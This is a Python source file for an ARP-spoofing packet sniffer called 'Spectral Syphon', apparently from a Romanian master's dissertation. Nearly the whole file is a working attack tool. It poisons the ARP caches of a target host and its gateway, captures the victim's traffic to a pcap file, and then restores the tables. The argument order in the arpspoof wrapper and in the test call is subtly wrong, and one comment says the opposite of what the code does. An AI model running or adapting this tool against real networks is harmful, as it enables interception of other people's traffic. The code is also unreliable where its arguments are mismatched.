###########################################################################
###########################################################################
###########################################################################
###########                                                     ###########
###########                  SPECTRAL SYPHON                    ###########
###########                   Packet sniffer                    ###########
###########                    Version 1.0                      ###########
###########                                                     ###########
###########               PROIECT DE DISERTATIE                 ###########
###########         Author: Ion-Margarit Adrian-Florin          ###########
###########       Facultatea de Matematica si Informatica       ###########
###########             Universitatea din Bucuresti             ###########
###########                                                     ###########
###########################################################################
###########################################################################
###########################################################################


from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)
from colorama import Fore, Back, Style
import os
import sys
import subprocess
import time

# Access is restricted to non-root/non-sudo users
if not 'SUDO_UID' in os.environ.keys():
    print(
        f'{Fore.RED}[!!!] Please run this script as root or sudo! No sudo, no privileges!{Style.RESET_ALL}')
    sys.exit()

# This function is used to get the MAC address of the target


def getmac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return (r[Ether].src.upper())
    return None

# Creating a class for the ARP Spoofer tool


class ArpSpoofer:
    def __init__(self, target, gateway, iface, count):
        self.poison_thread = Process(target=self.poison)
        self.sniff_thread = Process(target=self.sniff)
        self.target = target
        self.count = count
        self.gateway = gateway
        self.targetmac = getmac(target)
        self.gatewaymac = getmac(gateway)
        self.iface = iface
        conf.iface = iface
        conf.verb = 0

        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Interface:{Style.RESET_ALL}{Fore.CYAN} {iface}{Style.RESET_ALL}')
        print(f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Target:{Style.RESET_ALL}{Fore.CYAN} {target}{Style.RESET_ALL}{Fore.RED} MAC:{Style.RESET_ALL}{Fore.YELLOW} {self.targetmac}{Style.RESET_ALL}')
        print(f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Gateway:{Style.RESET_ALL}{Fore.CYAN} {gateway}{Style.RESET_ALL}{Fore.RED} MAC:{Style.RESET_ALL}{Fore.YELLOW} {self.gatewaymac}{Style.RESET_ALL}')

    # This function is used to start the threads
    def run(self):
        try:
            self.poison_thread.start()
            self.sniff_thread.start()
        except Exception as e:
            print(f'{Fore.RED}[---] Error: {e}{Style.RESET_ALL}')
            self.poison_thread.terminate()
            self.sniff_thread.terminate()
            sys.exit()
        except KeyboardInterrupt:
            pass

    # This function is used to poison the ARP cache
    def poison(self):
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway
        poison_target.pdst = self.target
        poison_target.hwdst = self.targetmac

        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} IP Source:{Style.RESET_ALL}{Fore.CYAN} {poison_target.psrc}{Style.RESET_ALL}')
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} IP Destination:{Style.RESET_ALL}{Fore.CYAN} {poison_target.pdst}{Style.RESET_ALL}')
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} MAC Destination:{Style.RESET_ALL}{Fore.CYAN} {poison_target.hwdst}{Style.RESET_ALL}')
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} MAC Source:{Style.RESET_ALL}{Fore.CYAN} {poison_target.hwsrc}{Style.RESET_ALL}')

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.target
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} IP Source:{Style.RESET_ALL}{Fore.CYAN} {poison_gateway.psrc}{Style.RESET_ALL}')
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} IP Destination:{Style.RESET_ALL}{Fore.CYAN} {poison_gateway.pdst}{Style.RESET_ALL}')
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} MAC Destination:{Style.RESET_ALL}{Fore.CYAN} {poison_gateway.hwdst}{Style.RESET_ALL}')
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} MAC Source:{Style.RESET_ALL}{Fore.CYAN} {poison_gateway.hwsrc}{Style.RESET_ALL}')

        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} ARP Poisoning commencing...{Style.RESET_ALL}')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_target)
                send(poison_gateway)
                time.sleep(2)
            except Exception as e:
                print(f'{Fore.RED}[---] Error: {e}{Style.RESET_ALL}')
                self.poison_thread.terminate()
                self.sniff_thread.terminate()
                sys.exit()
            except KeyboardInterrupt:
                pass

    # This function is used to sniff packets
    def sniff(self):
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            sys.exit()

        filename = f'arpspoofer_{self.target}_{self.gateway}.pcap'

        if self.count == 0:
            print(
                f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Sniffing packets...{Style.RESET_ALL}')
        else:
            print(
                f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Sniffing packets >>> {self.count}...{Style.RESET_ALL}')

        try:
            bpf_filter = 'ip host %s' % self.target
            packets = sniff(count=self.count,
                            filter=bpf_filter, iface=self.iface)
        except Exception as e:
            print(f'{Fore.RED}[---] Error: {e}{Style.RESET_ALL}')
            self.poison_thread.terminate()
            self.sniff_thread.terminate()
            sys.exit()
        except KeyboardInterrupt:
            if self.count == 0:
                sys.exit()
            else:
                pass

        else:
            wrpcap(filename, packets)
            print(
                f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Packets saved to{Style.RESET_ALL} {Fore.YELLOW}{filename}{Style.RESET_ALL}')
            self.restore()
            print(
                f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Sniffing finished successfully!{Style.RESET_ALL}')
            self.poison_thread.terminate()

    # This function restores the ARP tables
    def restore(self):
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Started to restore the ARP tables...{Style.RESET_ALL}')

        try:
            send(ARP(op=2, psrc=self.gateway, pdst=self.target,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), count=5)
            send(ARP(op=2, psrc=self.target, pdst=self.gateway,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.targetmac), count=5)
        except Exception as e:
            print(f'{Fore.RED}[---] Error: {e}{Style.RESET_ALL}')
            sys.exit()
        except KeyboardInterrupt:
            pass

        else:
            print(
                f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} ARP tables are restored successfully!{Style.RESET_ALL}')
            self.poison_thread.terminate()

# This function is for testing purposes


def arpspoof(target, iface, gateway, count=0):
    arp = ArpSpoofer(target, gateway, count, iface)
    arp.run()


if __name__ == '__main__':
    # For testing purposes
    arpspoof('192.168.1.241', '192.168.1.2', 'wlp1s0', 100)
